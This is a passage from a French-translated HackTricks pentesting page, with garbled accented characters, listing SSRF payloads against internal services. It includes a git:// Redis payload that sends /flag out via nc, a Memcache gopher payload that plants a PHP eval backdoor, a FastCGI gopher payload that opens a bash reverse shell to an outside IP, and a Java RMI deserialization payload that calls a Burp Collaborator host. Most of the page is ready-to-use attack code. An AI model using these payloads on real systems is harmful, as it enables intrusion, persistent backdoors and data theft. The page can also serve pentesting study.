Bien que cela n√©cessite un acc√®s authentifi√© √† GitLab pour √™tre exploit√©, je vais inclure la charge utile ici car le protocole `git` peut fonctionner sur la cible que vous piratez. Cette charge utile est fournie √† titre de r√©f√©rence.
```bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
## Memcache

**Port couramment utilis√© : 11211**

* [vBulletin Memcache RCE](https://www.exploit-db.com/exploits/37815)
* [GitHub Enterprise Memcache RCE](https://www.exploit-db.com/exploits/42392)
* [Exemple de charge utile Gopher pour Memcache](https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell)
```bash
gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
```
## Apache Tomcat

**Ports couramment utilis√©s : 80, 443 (SSL), 8080, 8443 (SSL)**

Efficace uniquement contre Tomcat 6 :

[gopher-tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)

R√©daction d'un CTF utilisant cette technique :

[De XXE √† RCE : Pwn2Win CTF 2018 Writeup](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)

## FastCGI

**Ports couramment utilis√©s : 80, 443 (SSL)**

Cela a √©t√© pris √† partir de [ici](https://blog.chaitin.cn/gopher-attack-surfaces/).
```bash
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```
## Java RMI

**Ports couramment li√©s : 1090, 1098, 1099, 1199, 4443-4446, 8999-9010, 9999**

Les vuln√©rabilit√©s _SSRF_ aveugles qui permettent l'utilisation d'octets arbitraires (bas√©es sur _gopher_) peuvent √™tre utilis√©es pour effectuer des attaques de d√©s√©rialisation ou de codebase sur les composants par d√©faut de _Java RMI_ (registre RMI, collecteur de d√©chets distribu√©, syst√®me d'activation). Un compte rendu d√©taill√© peut √™tre trouv√© [ici](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/). L'exemple suivant montre la g√©n√©ration de la charge utile :
```
$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
